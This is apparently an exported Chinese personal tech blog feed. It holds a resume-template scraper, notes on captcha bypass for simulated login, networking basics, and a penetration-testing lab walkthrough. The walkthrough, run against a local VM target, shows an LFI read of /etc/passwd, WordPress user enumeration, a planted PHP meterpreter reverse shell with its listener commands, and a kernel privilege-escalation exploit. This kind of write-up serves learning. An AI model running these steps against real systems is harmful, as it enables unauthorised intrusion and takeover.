data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token keyword">if</span> <span class="token keyword">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span><span class="token string">'./pics'</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="11"></td><td><pre>          os<span class="token punctuation">.</span>mkdir<span class="token punctuation">(</span><span class="token string">'./pics'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="12"></td><td><pre></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token keyword">for</span> page <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">21</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="14"></td><td><pre>       <span class="token keyword">if</span> page <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="15"></td><td><pre>          new_url <span class="token operator">=</span> <span class="token string">'http://sc.chinaz.com/jianli/free.html'</span></pre></td></tr><tr><td data-num="16"></td><td><pre>       <span class="token keyword">else</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="17"></td><td><pre>          new_url <span class="token operator">=</span> <span class="token builtin">format</span><span class="token punctuation">(</span>url<span class="token operator">%</span>page<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="18"></td><td><pre></pre></td></tr><tr><td data-num="19"></td><td><pre>       page_text <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>new_url<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">)</span><span class="token punctuation">.</span>text</pre></td></tr><tr><td data-num="20"></td><td><pre></pre></td></tr><tr><td data-num="21"></td><td><pre>       tree <span class="token operator">=</span> etree<span class="token punctuation">.</span>HTML<span class="token punctuation">(</span>page_text<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="22"></td><td><pre>       li_list <span class="token operator">=</span> tree<span class="token punctuation">.</span>xpath<span class="token punctuation">(</span><span class="token string">'//*[@id="container"]/div'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="23"></td><td><pre>       <span class="token comment">#print(li_list)</span></pre></td></tr><tr><td data-num="24"></td><td><pre></pre></td></tr><tr><td data-num="25"></td><td><pre>       <span class="token keyword">for</span> li <span class="token keyword">in</span> li_list<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="26"></td><td><pre>          img_src <span class="token operator">=</span><span class="token string">'http:'</span><span class="token operator">+</span>li<span class="token punctuation">.</span>xpath<span class="token punctuation">(</span><span class="token string">'./a/@href'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="27"></td><td><pre>          <span class="token comment"># print(img_src)</span></pre></td></tr><tr><td data-num="28"></td><td><pre></pre></td></tr><tr><td data-num="29"></td><td><pre>          img_name <span class="token operator">=</span> li<span class="token punctuation">.</span>xpath<span class="token punctuation">(</span><span class="token string">'./a/img/@alt'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">'.rar'</span></pre></td></tr><tr><td data-num="30"></td><td><pre>          img_name <span class="token operator">=</span> img_name<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'iso-8859-1'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="31"></td><td><pre>          <span class="token comment">#print(img_name)</span></pre></td></tr><tr><td data-num="32"></td><td><pre></pre></td></tr><tr><td data-num="33"></td><td><pre>          img_data <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>img_src<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">)</span><span class="token punctuation">.</span>text</pre></td></tr><tr><td data-num="34"></td><td><pre>          <span class="token comment">#print(img_data)</span></pre></td></tr><tr><td data-num="35"></td><td><pre>          tree <span class="token operator">=</span> etree<span class="token punctuation">.</span>HTML<span class="token punctuation">(</span>img_data<span class="token punctuation">)</span> <span class="token comment"># very essential!</span></pre></td></tr><tr><td data-num="36"></td><td><pre></pre></td></tr><tr><td data-num="37"></td><td><pre>          download_src <span class="token operator">=</span> tree<span class="token punctuation">.</span>xpath<span class="token punctuation">(</span><span class="token string">'//div[@id="down"]/div[2]//li[6]/a/@href'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="38"></td><td><pre>         <span class="token comment"># print(download_src)</span></pre></td></tr><tr><td data-num="39"></td><td><pre>          img_data <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>download_src<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">)</span><span class="token punctuation">.</span>content</pre></td></tr><tr><td data-num="40"></td><td><pre>          </pre></td></tr><tr><td data-num="41"></td><td><pre>          img_path <span class="token operator">=</span> <span class="token string">'pics/'</span><span class="token operator">+</span>img_name</pre></td></tr><tr><td data-num="42"></td><td><pre>          <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>img_path<span class="token punctuation">,</span><span class="token string">'wb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> fp<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="43"></td><td><pre>              fp<span class="token punctuation">.</span>write<span class="token punctuation">(</span>img_data<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="44"></td><td><pre>              <span class="token keyword">print</span><span class="token punctuation">(</span>img_name<span class="token punctuation">,</span><span class="token string">'Download succeed!'</span><span class="token punctuation">)</span></pre></td></tr></table></figure><p>谢谢观看</p>
]]></content>
      <categories>
        <category>wiki</category>
        <category>python</category>
        <category>爬虫</category>
      </categories>
      <tags>
        <tag>spidy</tag>
      </tags>
  </entry>
  <entry>
    <title>爬虫第二步——模拟登录</title>
    <url>/%E7%88%AC%E8%99%AB--%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95/</url>
    <content><![CDATA[<h2 id="验证码识别"><a class="anchor" href="#验证码识别">#</a> 验证码识别</h2>
<p>反爬机制：验证码，识别验证码图片中的数据，用于模拟登录操作</p>
<p>识别验证码的操作:<br />
- 人工肉眼识别<br />
 - 第三方自动识别<br />
 - 云打码: <span class="exturl" data-url="aHR0cDovL3d3dy55dW5kYW1hLmNvbS9kZW1vLmh0bWw=">http://www.yundama.com/demo.html</span><br />
 云打码使用流程:<br />
- 注册：普通和开发者用户<br />
 - 登录:<br />
- 普通用户的登录：查询该用户是否还有剩余的部分<br />
 - 开发者用户的登录:<br />
- 创建一个软件：我的软件 -&gt; 添加新软件 -&gt; 录入软件名称 -&gt; 提交 (软件 id 和密钥)<br />
- 下载实例代码：开发文档 -&gt; 点此下载：云打码接口 DLL -&gt; PythonHTTP 实例下载</p>
<p>模拟登录:<br />
- 爬取基于某些用户的用户信息</p>
<p>需求：对人人网进行模拟登录<br />
 - 点击登录按钮后会发起一个 post 请求<br />
 - post 请求中会携带登录之前录入的相关的登录信息 (用户名、密码、验证码)</p>
]]></content>
      <categories>
        <category>wiki</category>
        <category>python</category>
        <category>爬虫</category>
      </categories>
      <tags>
        <tag>spidy</tag>
      </tags>
  </entry>
  <entry>
    <title>TCP/IP协议栈、ARP协议及以太网技术</title>
    <url>/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<p>关于网络基础知识的归纳总结；后续会（也可能不会）更新<br />
<a id="more"></a></p>
<h2 id="osi参考模型"><a class="anchor" href="#osi参考模型">#</a> OSI 参考模型</h2>
<p><img data-src="https://i.loli.net/2021/09/14/Hl92j1DgFKNEwzT.png" alt="20190422230945318.PNG" /></p>
<ol>
<li>物理层：定义了一些介质，包括双绞线，光纤，网线等等。（Attention：传递信息索利用的设备，如上等等，并不在物理层协议之内，而是在物理层协议的下面）网络通信的目的是将数据从一端传输到另一端，在链路上传输的只能是数字信号。（数字信号有两种可能：0 和 1）<br />
数据单位：比特流</li>
</ol>
<p>数据终端设备（Data Terminal Equipment，DTE）<br />
具有一定的数据处理能力和数据收发能力的设备，用于提供或接收数据。常见的 DTE 设备有路由器、PC、终端等。</p>
<p>数据通信设备（Data Communications Equipment，DCE）<br />
在 DTE 和传输线路之间提供信号变换和编码功能，并负责建立、保持和释放链路的链接。常见的 DCE 设备有 CSU/DSU、NT1、广域网交换机、MODEM 等。<br />
两者的区别是：DCE 提供时钟，而 DTE 不提供时钟；DTE 的接头是针头（俗称公头），而 DCE 的接头是孔头（俗称母头）。</p>
<ol start="2">
<li>
<p>数据链路层：是提供对物理层的控制，在线路两端去协商什么是 0，什么是 1. 也就是说如果使用的是网线的话，是使用高频还是低频，需要两端去协商一致。具有流量控制功能<br />
数据单位：帧（SMAC、DMAC），随着每一段链路发生改变</p>
</li>
<li>
<p>网络层：实现跨线路的数据传输。主要负责寻找地址和路由选择<br />
数据单位：包（打包）（SIP、DIP）</p>
</li>
<li>
<p>传输层：进行端对端的控制而无需在路由器上处理（TCP/UDP）<br />
数据单位：段（分段）</p>
</li>
</ol>
<p><img data-src="https://i.loli.net/2021/09/14/uWCOxbS5PAflsFy.png" alt="983980-20161122175036159-1060298763.png" /><br />
 拟物化来说，传输层就是传输你选购的物件，网络层则是打包好这批物件从出发地到终点站的传输，数据链路层则是将所有物件封装在集装箱中在传输中途径大的中转站分类拣货 MAC 地址发生改变而原有的 IP 地址不改变的过程<br />
<img data-src="https://i.loli.net/2021/09/16/laJ7LtMToX6nE2x.png" alt="QQ截图20210916100704.png" /></p>
<p><img data-src="https://i.loli.net/2021/09/14/Hl92j1DgFKNEwzT.png" alt="20190422230945318.PNG" /></p>
<h2 id="tcpip分层模型"><a class="anchor" href="#tcpip分层模型">#</a> TCP/IP 分层模型</h2>
<h3 id="osi和tcpip的区别"><a class="anchor" href="#osi和tcpip的区别">#</a> OSI 和 TCP/IP 的区别</h3>
<p><img data-src="https://i.loli.net/2021/09/16/6gwbRV7NkOUYHxv.png" alt="20160818160129197.png" /></p>
<p><img data-src="https://i.loli.net/2021/09/16/fVyQTpnY7LGm2IR.png" alt="QQ截图20210916101855.png" /></p>
<h3 id="tcp原理"><a class="anchor" href="#tcp原理">#</a> TCP 原理</h3>
<p><img data-src="https://i.loli.net/2021/09/16/dAlXc5Fk6wVhI4E.png" alt="QQ截图20210916101903.png" /></p>
<p><img data-src="https://i.loli.net/2021/09/16/4LAxCUkYe3R9STH.png" alt="QQ截图20210916101945.png" /></p>
<p><img data-src="https://i.loli.net/2021/09/16/qkQbeUsajMEp5zV.png" alt="QQ截图20210916102014.png" /></p>
<p><img data-src="https://i.loli.net/2021/09/16/YnpXWHRlafTxBQN.png" alt="QQ截图20210916102022.png" /></p>
<p><img data-src="https://i.loli.net/2021/09/16/z1vNLgpxandoqMe.png" alt="QQ截图20210916102029.png" /></p>
<p>TTL（TIME TO LIVE）值的功能：防止环路</p>
<h2 id="arp协议"><a class="anchor" href="#arp协议">#</a> ARP 协议</h2>
<p>ARP（地址解析协议）<br />
根据已知的 IP 地址解析获取相对应的 MAC 地址</p>
<p><img data-src="https://i.loli.net/2021/09/16/7kLpbar2NRUQDuy.png" alt="QQ截图20210916102348.png" /></p>
<p><img data-src="https://i.loli.net/2021/09/16/df1Mb6C3eochXOn.png" alt="QQ截图20210916102359.png" /></p>
<p><img data-src="https://i.loli.net/2021/09/16/p5vVLhTbcAPKqCa.png" alt="QQ截图20210916102411.png" /></p>
<p><img data-src="https://i.loli.net/2021/09/16/63CmF7fUwtcSizL.png" alt="QQ截图20210916102419.png" /></p>
<p><img data-src="https://i.loli.net/2021/09/16/gS4Wjh2wB5qkVXm.png" alt="QQ截图20210916102426.png" /></p>
<p>假设主机 A 想要访问主机 C 需要知道主机 C 的 SMAC&amp;DIP<br />
 主机 A 发送一个数据包给主机 C 获得 C 的 MAC 地址映射在 ETH_II 表中、ARP 中存在 SIP\DIP\SMAC<br />
ARP 报文是以广播的形式进行发送<br />
 ARP 报文不能穿越路由器，不能转发到其他广播域<br />
免费 ARP 可以用来探测 IP 地址是否冲突</p>
<h2 id="以太网技术"><a class="anchor" href="#以太网技术">#</a> 以太网技术</h2>
<p>以太网是建立在 CSMA/CD（载波监听多路访问、冲突检测）机制上的广播型网络，只是局域网中的一个协议，并不等同局域网<br />
<img data-src="https://i.loli.net/2021/09/16/uOiIH2FN4CpD9de.png" alt="QQ图片20210916090211.png" /><br />
 常见的以太网设备包括 Hub、交换机等。交换机工作在数据链路层，具有检查并转发的过程；转发数据帧，有效隔离冲突域<br />
但在交换式的以太网中无法隔离广播域<br />
<mark>广播域：交换机不能隔离广播域，路由器可以隔离广播域</mark></p>
<p><img data-src="https://i.loli.net/2021/09/16/YfrqmS2Jzipk964.png" alt="QQ图片20210916091055.png" /></p>
<p>每一个以太网卡上都有一个特有的 MAC 地址用来标识<br />
<img data-src="https://i.loli.net/2021/09/16/Ia9f7OLslRzm2HP.png" alt="QQ图片20210916091240.png" /></p>
<h3 id="以太网帧"><a class="anchor" href="#以太网帧">#</a> 以太网帧</h3>
<p><img data-src="https://i.loli.net/2021/09/16/ZKWSPt4l7arEFuk.png" alt="QQ图片20210916091937.png" /><br />
 通常使用第一种<br />
 802.3 格式的典型：ISIS 动态路由协议</p>
<p>MAC 地址和 IP 地址的差别：</p>
<ol>
<li>以太网的 MAC 地址：48bit 6 Byte   IP 地址：32bit</li>
<li>MAC 地址唯一不可变 IP 地址唯一却可变</li>
<li>基于制造商进行 MAC 地址分配  基于网络拓扑进行 IP 地址分配<br />
 MAC 地址构成：<br />
OUI：厂商代码，由 IEEE 分配 3 Byte 24bit<br />
 制造商分配： 3 Byte 24bit</li>
</ol>
<p>MAC 地址可分为单播、广播、组播 MAC 地址<br />
<img data-src="https://i.loli.net/2021/09/16/bxIHND4WACSonlE.png" alt="QQ截图20210916093221.png" /></p>
<ol>
<li>单播以太帧：一对一的传输<br />
<img data-src="https://i.loli.net/2021/09/16/lOgX2qjhxbfDF3G.png" alt="QQ截图20210916093314.png" /></li>
<li>组播以太帧：一对多的传输<br />
<img data-src="https://i.loli.net/2021/09/16/R7AcjQIqoBytdOl.png" alt="QQ截图20210916093455.png" /></li>
<li>广播以太帧：多对多的传输<br />
<img data-src="https://i.loli.net/2021/09/16/kzOs7NxJPRQhlvX.png" alt="QQ截图20210916093410.png" /></li>
</ol>
<h3 id="以太网中的交换机"><a class="anchor" href="#以太网中的交换机">#</a> 以太网中的交换机</h3>
<p><img data-src="https://i.loli.net/2021/09/16/DzqOZySCHgIt5VW.png" alt="QQ截图20210916093945.png" /></p>
<p><img data-src="https://i.loli.net/2021/09/16/IPKYrJ9gQw3CROL.png" alt="QQ截图20210916094135.png" /><br />
 初始情况下，交换机的 MAC 地址表是空的，表项中不存在目的 MAC 地址的信息，此时 DMAC 为未知单播帧。</p>
<p>那交换机该如何处理呢？</p>
<p>由于表中不存在 DMAC，那么交换机就会从所有端口（除了接收 SMAC 的端口）将信息发送出去</p>
<p>上面是我的通俗见解；下面是官方解释：<br />
<img data-src="https://i.loli.net/2021/09/15/NlouX5bvKHYCaEy.png" alt="图片1.png" /><br />
 假设主机 A 想要访问主机 B<br />
SIP: 10.1.1.1<br />
DIP: 10.1.1.2<br />
SMAC: 00-01-02-03-AA<br />
DMAC: 00-01-02-03-BB</p>
<p><img data-src="https://i.loli.net/2021/09/16/3DCS4ox9uh8QY72.png" alt="QQ截图20210916100131.png" /></p>
<p>交换机刚刚启动时，里面没有任何映射关系<br />
 1、首先根据 SMAC 地址更新 MAC 地址表，将收到该数据帧的接口和 SMAC 地址的对应关系映射到 MAC 地址表中<br />
 2、查看 MAC 地址，如果 MAC 地址表中有该地址，根据对应的接口进行转发，如果 MAC 地址表中没有该地址，则以泛洪的形式发送该报文（泛洪：除收到该数据帧的接口之外，全部发送）</p>
<p>主机 B 收到并处理该数据帧，向主机 A 回复，并将数据帧发往交换机<br />
（交换机的两个任务：学和转发）</p>
<h3 id="同网段数据通信全过程"><a class="anchor" href="#同网段数据通信全过程">#</a> 同网段数据通信全过程</h3>
<p><img data-src="https://i.loli.net/2021/09/16/XuZLSRa2fNJ1chV.png" alt="QQ截图20210916104143.png" /></p>
<p>交换机刚上电时 MAC 地址表为空<br />
<img data-src="https://i.loli.net/2021/09/16/S1ePMKguAnGUapo.png" alt="QQ截图20210916104154.png" /></p>
<p><img data-src="https://i.loli.net/2021/09/16/VjG8nRlA7OiuIPK.png" alt="QQ截图20210916104325.png" /><br />
 接收到主机 1 的数据帧，记录他的 SMAC 地址和端口号<br />
<img data-src="https://i.loli.net/2021/09/16/ARsf3PqnljgBJL2.png" alt="QQ截图20210916104355.png" /></p>
<p>主机 2 收到来自主机 1 发送的数据帧后，返回响应给主机 1；此时 SMAC 为 MAC2,SIP 为 IP2；交换机接收到主机 2 的响应数据帧依旧学习，记录他的 SMAC 地址和端口号<br />
<img data-src="https://i.loli.net/2021/09/16/8jbFPygiD7GShTX.png" alt="QQ截图20210916104403.png" /></p>
<p>MAC 地址的老化时间是 300s</p>
]]></content>
      <categories>
        <category>计算机网络基础</category>
        <category>TCP/IP协议栈、ARP协议、以太网技术</category>
      </categories>
      <tags>
        <tag>TCP/IP协议栈、ARP协议、以太网技术</tag>
      </tags>
  </entry>
  <entry>
    <title>我的第一次...</title>
    <url>/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</url>
    <content><![CDATA[<p>第一次都有点不熟练，以后一定多练几次</p>
<p><a id="more"></a></p>
<p>打开这次环境需要的漏洞靶机，并且再开一台 kali 攻击机，这里我用 xshell 连接</p>
<p><img data-src="https://s3.bmp.ovh/imgs/2022/07/01/6dc015bb26281aef.png" alt="" /></p>
<p>在这里我们可以用 nmap 来扫描电脑开放的网段。确定哪些服务运行在哪些连接端，并且推断计算机运行哪个操作系统，129 是我 kali 的 ip，推断 130 那个就是靶机 ip 了</p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre>nmap -sP <span class="token number">192.168</span>.204.0/24</pre></td></tr></table></figure><p><img data-src="https://s3.bmp.ovh/imgs/2022/07/01/171cbec2c6582b05.png" alt="" /></p>
<p>排除掉一些特别大或特别小的子网，最终还剩下两个选择，在 vmware 的网络适配器里找到靶机的对应的 MAC 地址就可</p>
<p><img data-src="https://s3.bmp.ovh/imgs/2022/07/01/81c90e9694dca081.png" alt="" /></p>
<p>那么我们这里靶机的 IP 就是 192.168.204.130</p>
<p>通过这条 ip 我们可以查询该靶机上现在在运行哪些软件，</p>
<p>用扫描器扫端口，冲他。</p>
<p>通过端口号我们就可以对应查询到该服务器目前执行着哪些协议</p>
<p><img data-src="https://s3.bmp.ovh/imgs/2022/07/01/8506807638eb71a6.png" alt="" /></p>
<p>Nmap 不仅可以告知端口还有端口运行的协议、版本</p>
<p>下面便是我们扫出来的结果</p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre>nmap -p <span class="token number">1</span>-65535 -A <span class="token number">192.168</span>.204.130</pre></td></tr></table></figure><p><img data-src="https://s3.bmp.ovh/imgs/2022/07/01/028eb0554361a65f.png" alt="" /></p>
<p>接下来就该考虑从哪个端口入手了，http or ssh？</p>
<p>我们先去浏览器看一下这个 ip 吧</p>
<p><img data-src="https://s3.bmp.ovh/imgs/2022/07/01/625c33405bae3211.png" alt="" /></p>
<p>啥也不是..</p>
<p>那么只能扫一下目录康康囖</p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre>dirb http://192.168.204.130/</pre></td></tr></table></figure><p><img data-src="https://s3.bmp.ovh/imgs/2022/07/01/474977ffef76ea3c.png" alt="" /></p>
<p>扫描结果有 15 个可以利用的</p>
<p><img data-src="https://s3.bmp.ovh/imgs/2022/07/01/909ac08e712bda58.png" alt="" /></p>
<p>每个都尝试了一下发现都没有什么突破的地方，倒是扫出来不少 wordpress</p>
<p><img data-src="https://s3.bmp.ovh/imgs/2022/07/01/ebc1f892933491e3.png" alt="" /></p>
<p>那么就具体一点，直接指定后缀关键字搜索</p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre>dirb http://192.168.204.130/ -X .txt,.php,.zip</pre></td></tr></table></figure><p><img data-src="https://s3.bmp.ovh/imgs/2022/07/01/c44714b7e66d636f.png" alt="" /></p>
<p>挨个查看，下一步提示出来啦。看来方向在 http 这里没错的</p>
<p>secre.txt 里有线索</p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">curl</span> http://192.168.204.130/secret.txt</pre></td></tr></table></figure><p><img data-src="https://s3.bmp.ovh/imgs/2022/07/01/d9089971679b0349.png" alt="" /></p>
<p>第一次 fuzz 出来都是没用的东西，那么第二次还是采用过滤吧</p>
<p><img data-src="https://s3.bmp.ovh/imgs/2022/07/01/e0cca1fb1db41a42.png" alt="" /></p>
<p>在 fuzz 里 --hw（--hc --hl）都是把固定的位数隐藏起来，这也就直接过滤掉了 12 位的 word</p>
<p><img data-src="https://s3.bmp.ovh/imgs/2022/07/01/7bd5f7b68f04ba53.png" alt="" /></p>
<p>把这个参数 file 和之前给的 location.txt 拼接起来</p>
<figure class="highlight html"><figcaption data-lang="HTML"></figcaption><table><tr><td data-num="1"></td><td><pre>http://192.168.204.130/index.php?file=location.txt</pre></td></tr></table></figure><p><img data-src="https://s3.bmp.ovh/imgs/2022/07/01/277e4e9bc47521d4.png" alt="" /></p>
<p>提示让我们在另一个 php 里面寻找答案且参数给定 &quot;secrettier360&quot;。那么除了 index.php, 我们还剩下 image.php</p>
<figure class="highlight html"><figcaption data-lang="HTML"></figcaption><table><tr><td data-num="1"></td><td><pre>访问 http://192.168.204.130/image.php?secrettier360=/etc/passwd</pre></td></tr></table></figure><p><img data-src="https://s3.bmp.ovh/imgs/2022/07/01/f47dd6d5f34b79de.png" alt="" /></p>
<p>结果提示应该在 /home/saket 中寻找 password.txt</p>
<p><img data-src="https://s3.bmp.ovh/imgs/2022/07/01/04e4d3220e33b92e.png" alt="" /></p>
<p>我猜是 ubuntu 的登陆密码</p>
<p><img data-src="https://s3.bmp.ovh/imgs/2022/07/01/b02441b770a5cacd.png" alt="" /></p>
<p>然鹅不是。。</p>
<p>但是我们之前还扫出来一个 wordress 的网站，并且他还是有登陆界面的，那么这串字符会不会是博客的账户密码呢？</p>
<p>试试看</p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre>wpscan --url http://192.168.204.130/wordpress/ --enumerate u</pre></td></tr></table></figure><p><img data-src="https://s3.bmp.ovh/imgs/2022/07/01/3167cbd8e1d3268f.png" alt="" /></p>
<p>得到账户用户名 victor</p>
<p><img data-src="https://s3.bmp.ovh/imgs/2022/07/01/ba02445b57ee2815.png" alt="" /></p>
<p>用前面得到的密码我们进入网站</p>
<p><img data-src="https://s3.bmp.ovh/imgs/2022/07/02/e6581f882512428e.png" alt="" /></p>
<p>在可编辑的项目栏找到可以操作的 php，就是这了。</p>
<p>接下来一步就是上传指令进行提权了，一句话木马、反弹链接、msf 都可以，我个人是认为最好用 msf 的，因为一句话木马存在一些不可预测的限制，有时候就比如服务器 ip 可能会改变，用菜刀啥的就连不上，有时反弹链接要比一句话木马主动连接要更好一点。</p>
<p>这里我就采用 msf 生成 php 的反弹链接的代码去监听了</p>
<p><img data-src="https://s3.bmp.ovh/imgs/2022/07/02/3d69c7627256f41e.png" alt="" /></p>
<p>生成一个 shell.php</p>
<p>在新开一个窗口，用 msfconsole 去启动监听</p>
<p><img data-src="https://s3.bmp.ovh/imgs/2022/07/02/4a08e2c6168ea32b.png" alt="" /></p>
<p>运行监听模块</p>
<p>去获取 shell.php</p>
<p><img data-src="https://s3.bmp.ovh/imgs/2022/07/02/4ab99ac5af2a6e3c.png" alt="" /></p>
<p>然后粘贴到 wordpress 的 secret.php 编辑栏里</p>
<p><img data-src="https://s3.bmp.ovh/imgs/2022/07/02/7fc0c1865d841b8f.png" alt="" /></p>
<p>上传代码，通过浏览器运行链接成功</p>
<p>监听配置完成</p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre>use exploit/multi/handler</pre></td></tr></table></figure><figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token builtin class-name">set</span> payload php/meterpreter/reverse_tcp</pre></td></tr></table></figure><figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token builtin class-name">set</span> lhost <span class="token number">192.168</span>.204.129</pre></td></tr></table></figure><figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token builtin class-name">set</span> port <span class="token number">4444</span></pre></td></tr></table></figure><figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre>exploit</pre></td></tr></table></figure><p><img data-src="https://s3.bmp.ovh/imgs/2022/07/02/a264606a011e8417.png" alt="" /></p>
<p>sudo -i（排除）</p>
<p><img data-src="https://s3.bmp.ovh/imgs/2022/07/02/7560d2f7e63ec209.png" alt="" /></p>
<p>history</p>
<p>/ find</p>
<p>操作系统内核漏洞 ---</p>
<p>已经知道内核版本是多少了，显而易见这是值得尝试的一条线</p>
<p>还是照例打开 msfconsole</p>
<p>然后查找有关该版本号的 ubuntu 漏洞</p>
<p><img data-src="https://s3.bmp.ovh/imgs/2022/07/02/e4be7bf1aac954b2.png" alt="" /></p>
<p>扫出来一条小于 4.13 的版本并且是个存在提权的漏洞，后面的 c 文件是个已经写好的脚本，直接拿来用就好，不跟你嘻嘻哈哈</p>
<p><img data-src="https://s3.bmp.ovh/imgs/2022/07/02/3ecc447ed961baff.png" alt="" /></p>
<p>找到后拿出来编译一下传到靶机上去</p>
<p><img data-src="https://s3.bmp.ovh/imgs/2022/07/02/d598b9bad04b0328.png" alt="" /></p>
<p>传上去之后 shell 开始，发现操作权限不够我们首先要增加可执行权限</p>
<p><img data-src="https://s3.bmp.ovh/imgs/2022/07/02/f3a99bb98268f905.png" alt="" /></p>
<p>查看目录找到 root 的文件</p>
<p>cat 打开是一串哈希值，解不出来。看来是登陆不进去了，不过我们都获得 root 权限，也无所谓了</p>
<p>至于 key.txt 什么的，随他们去吧。。</p>
<p><img data-src="https://s3.bmp.ovh/imgs/2022/07/02/47f7fe9f3aa54f1e.png" alt="" /></p>
<p>一次小小渗透就算完成了，还是翻阅查找了不少东西的，在此感谢。</p>
]]></content>
      <categories>
        <category>WEB</category>
        <category>渗透</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>请问大吉杯的签到是在这里签吗?</title>
    <url>/%E8%AF%B7%E9%97%AE%E5%A4%A7%E5%90%89%E6%9D%AF%E7%9A%84%E7%AD%BE%E5%88%B0%E6%98%AF%E5%9C%A8%E8%BF%99%E9%87%8C%E7%AD%BE%E5%90%97/</url>
    <content><![CDATA[<p>之前没接触过 zlib 文件格式；一直在思考如何将文件中的 zlib 解压，这一题整整忙了我两天.<br />
 我是傻逼.<br />
<a id="more"></a></p>
<h2 id="notepad查看"><a class="anchor" href="#notepad查看">#</a> Notepad 查看</h2>
<p>把下载下来的 png 用 Notepad 打开，发现里面还藏着一个 png.</p>
<p><img data-src="https://i.loli.net/2021/01/27/VJ3P6ty4LqXoUCe.png" alt="" /></p>
<h2 id="我们用binwalk分离一下"><a class="anchor" href="#我们用binwalk分离一下">#</a> 我们用 binwalk 分离一下</h2>
<p><img data-src="https://i.loli.net/2021/01/27/FoZMvwyrtHJ6QUD.png" alt="" /></p>
<p><img data-src="https://i.loli.net/2021/01/27/tdCzyXp8U5wS4iB.png" alt="" /></p>
<p>发现分离文件中有一张 png, 一张在 zip 里的 png，一份空白文档 (我以为有什么妙用，缩放 (并不是) 二维码什么的) 以及一份 zlib 文件；(接下来的几天里我一直在攻略这份 zlib)</p>
<p><img data-src="https://i.loli.net/2021/01/27/NIRQDtWlx3kG2gU.png" alt="" /></p>
<p>依据在此，我更加确信这是出错在 zlib. 于是在搜索引擎里不断地搜索关于 zlib 解压的方法 (我是傻逼)<br />
···<br />
···<br />
后来，我才知道，有 zlib 说明大概率是 LSB 隐写；</p>
<p>在此之前，我先把分离出的 4 张 png 都扫了一遍</p>
<p><img data-src="https://i.loli.net/2021/01/27/qsa24LPozNOHSYI.jpg" alt="" /></p>
<p><img data-src="https://i.loli.net/2021/01/27/nSgAQOD2icHZNMT.jpg" alt="" /></p>
<p><img data-src="https://i.loli.net/2021/01/27/N13dXg7TDVlZiGJ.jpg" alt="" /></p>
<p><img data-src="https://i.loli.net/2021/01/27/sbgj7Dx4zcPTWde.jpg" alt="" /></p>
<p>可以清楚地知道，第二张图已经明确告诉我们扫到第二张就行了，error 就在 png2;</p>
<p><img data-src="https://i.loli.net/2021/01/27/Z2lDuG6rELa35pF.png" alt="" /></p>
<h2 id="放入stegsolve-记住此刻原图的形状我觉得倒像是一只兔子"><a class="anchor" href="#放入stegsolve-记住此刻原图的形状我觉得倒像是一只兔子">#</a> 放入 stegsolve (记住此刻原图的形状，我觉得倒像是一只兔子)</h2>
<p>然后我们查看最低位通道图</p>
